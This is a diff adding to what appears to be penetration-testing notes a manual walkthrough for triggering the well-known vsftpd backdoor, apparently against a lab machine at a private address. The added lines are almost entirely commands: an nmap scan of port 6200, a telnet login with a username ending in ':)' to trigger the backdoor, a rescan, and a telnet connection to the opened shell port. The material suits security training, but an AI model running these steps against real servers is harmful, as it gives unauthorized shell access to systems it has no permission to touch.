@@ -92,6 +92,31 @@ OR
 ```
 exploit
 ```
+
+* Testing backdoor vsftpd manual
+```
+nmap -sS -p 6200 192.168.211.129
+```
+```
+telnet  192.168.211.129 21
+```
+tape
+```
+user backdoor:)
+```
+tape
+```
+pass doesitmatter?
+```
+retest port
+```
+nmap -sS -p 6200 192.168.211.129
+```
+Opening backdoor
+```
+telnet  192.168.211.129 6200
+```
+
 * Testing backdoor vsftpd : 
 ```
 nmap -sV -p 21 <ip_victim>
